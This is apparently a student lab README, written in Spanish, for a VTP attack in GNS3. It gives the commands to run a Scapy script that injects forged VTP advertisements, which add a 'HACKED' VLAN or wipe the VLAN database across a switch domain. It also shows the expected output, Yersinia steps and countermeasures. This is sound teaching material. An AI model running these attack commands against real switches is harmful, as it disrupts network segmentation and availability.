# VTP Attack Lab – Agregar y Eliminar VLANs

> **Laboratorio de Seguridad en Redes – ITLA (2024-1185)**  
> Práctica educativa para analizar el comportamiento del protocolo VTP en un entorno controlado utilizando GNS3.



## 📖 Descripción

Este laboratorio demuestra cómo funciona la propagación de información VLAN mediante **VTP (VLAN Trunking Protocol)** y cómo una modificación de la base de datos VLAN puede replicarse automáticamente entre switches pertenecientes al mismo dominio.

El entorno está diseñado exclusivamente para fines académicos y de investigación dentro de un laboratorio aislado utilizando GNS3.

---

## 🖧 Topología del Laboratorio

```text
┌─────────────────────────────────────────────────────────┐
│                                                         │
│   Linux2024-1185-1 (eth0)                               │
│          │                                              │
│       e0/0 ◄──── Tráfico generado desde Linux           │
│       IOU1 (VTP Server - Dominio: LAB)                  │
│       e0/1                                              │
│          │                                              │
│      Trunk 802.1Q                                       │
│          │                                              │
│       e0/0                                              │
│       IOU2 (VTP Client - Dominio: LAB)                  │
│                                                         │
└─────────────────────────────────────────────────────────┘
```
<img width="579" height="566" alt="image" src="https://github.com/user-attachments/assets/cee2735b-50a5-44c4-b08f-4cfc68bc2ca4" />

---

## 🔍 Concepto del Ataque VTP

**VTP (VLAN Trunking Protocol)** permite sincronizar automáticamente la base de datos VLAN entre switches pertenecientes al mismo dominio.

El switch que posea el **Configuration Revision Number** más alto será considerado como la versión más reciente de la base de datos VLAN.

### Flujo del Proceso

```text
Atacante (Linux)
       │
       │  ① Summary Advertisement
       │     Revision = 35000
       ▼
     IOU1
       │
       │  ② Subset Advertisement
       │     VLAN 666 "HACKED"
       ▼
     IOU2

Resultado:
Todos los switches del dominio actualizan
su base de datos VLAN automáticamente.
```

### ¿Por qué funciona?

- VTP v1/v2 no valida el origen de los anuncios VTP.
- Los switches confían en el número de revisión recibido.
- Una revisión superior puede sobrescribir la base de datos existente.
- La sincronización se replica automáticamente entre switches del mismo dominio.

---

## ⚙️ Configuración Inicial

### IOU1 – VTP Server

```cisco
configure terminal

vtp domain LAB
vtp mode server
vtp version 2

interface ethernet 0/1
 switchport trunk encapsulation dot1q
 switchport mode trunk
 no shutdown

end
```

#### Verificación

```cisco
show vtp status
show vlan brief
```

---

### IOU2 – VTP Client

```cisco
configure terminal

vtp domain LAB
vtp mode client

interface ethernet 0/0
 switchport trunk encapsulation dot1q
 switchport mode trunk
 no shutdown

end
```

#### Verificación

```cisco
show vtp status
show vlan brief
```

---

### Verificar la Revisión Actual

Antes de ejecutar cualquier prueba:

```cisco
show vtp status
```

Buscar una línea similar a:

```text
Configuration Revision : 5
```

> **Importante:** El valor utilizado en `--rev` debe ser mayor que la revisión actual.

---

## 🛠️ Instalación

### Dependencias

```bash
pip install scapy
```

---

 Uso del Script

### Sintaxis General

```bash
sudo python3 vtp_attack.py \
    -i INTERFAZ \
    --mode [add|delete] \
    [--vlan-id ID] \
    [--vlan-name NOMBRE] \
    --domain DOMINIO \
    --rev NUMERO
```

### Parámetros

| Parámetro | Tipo | Descripción |
|-----------|------|-------------|
| `-i` | string | Interfaz de red del atacante |
| `--mode` | string | `add` o `delete` |
| `--vlan-id` | int | ID de VLAN |
| `--vlan-name` | string | Nombre de VLAN |
| `--domain` | string | Dominio VTP |
| `--rev` | int | Número de revisión |

---

## ➕ Agregar VLAN

### Ejemplo

```bash
sudo python3 vtp_attack.py \
    -i eth0 \
    --mode add \
    --vlan-id 666 \
    --vlan-name HACKED \
    --domain LAB \
    --rev 35000
```

### Salida Esperada

```text
══════════════════════════════════════════════════════
 [LAB] AGREGAR VLAN
 Interface : eth0
 VLAN ID   : 666
 VLAN Name : HACKED
 Dominio   : LAB
 Revisión  : 35000
══════════════════════════════════════════════════════

 [Paso 1/2] Enviando Summary Advertisement...
 [Paso 2/2] Enviando Subset Advertisement...

 [✓] VLAN propagada al dominio LAB
```

### Verificación

```cisco
show vlan brief
```

Resultado esperado:

```text
VLAN Name                             Status
---- -------------------------------- --------
1    default                          active
666  HACKED                           active
```

---

## ➖ Eliminar VLANs

> **Importante:** Utilizar un número de revisión superior al utilizado anteriormente.

### Ejemplo

```bash
sudo python3 vtp_attack.py \
    -i eth0 \
    --mode delete \
    --domain LAB \
    --rev 35001
```

### Salida Esperada

```text
══════════════════════════════════════════════════════
 [LAB] ELIMINAR VLANs
 Interface : eth0
 Dominio   : LAB
 Revisión  : 35001
══════════════════════════════════════════════════════

 [Paso 1/2] Enviando Summary Advertisement...
 [Paso 2/2] Enviando Subset Advertisement...
```

### Verificación

```cisco
show vlan brief
```

Resultado esperado:

```text
VLAN Name                             Status
---- -------------------------------- --------
1    default                          active
```

---

## 🔧 Yersinia como Alternativa

### Modo Interactivo

```bash
sudo yersinia -I
```

### Pasos

```text
g   → Seleccionar protocolo VTP
F2  → Editar parámetros
F3  → Ejecutar prueba
```

### Comparación

| Característica | Script Python | Yersinia |
|---------------|---------------|-----------|
| Automatización | Sí | Parcial |
| Personalización | Alta | Media |
| Control de revisión | Completo | Limitado |
| Código modificable | Sí | No |
| Instalación | Scapy | Incluido en Kali |

---

## 📝 Secuencia Completa del Laboratorio

### 1. Verificar revisión actual

```cisco
show vtp status
```

### 2. Ejecutar la prueba

```bash
sudo python3 vtp_attack.py \
    -i eth0 \
    --mode add \
    --vlan-id 666 \
    --vlan-name HACKED \
    --domain LAB \
    --rev 35000
```

### 3. Verificar propagación

```cisco
show vlan brief
```

### 4. Ejecutar segunda prueba

```bash
sudo python3 vtp_attack.py \
    -i eth0 \
    --mode delete \
    --domain LAB \
    --rev 35001
```

### 5. Verificar resultado

```cisco
show vlan brief
show vtp status
```

---

## 🛡️ Contramedidas

| Medida | Comando |
|----------|----------|
| Modo transparente | `vtp mode transparent` |
| Contraseña VTP | `vtp password CLAVE` |
| VTP versión 3 | `vtp version 3` |
| Desactivar VTP | `vtp mode off` |
| Reiniciar revisión | Cambiar y restaurar dominio |
| Port Security | `switchport port-security` |

---


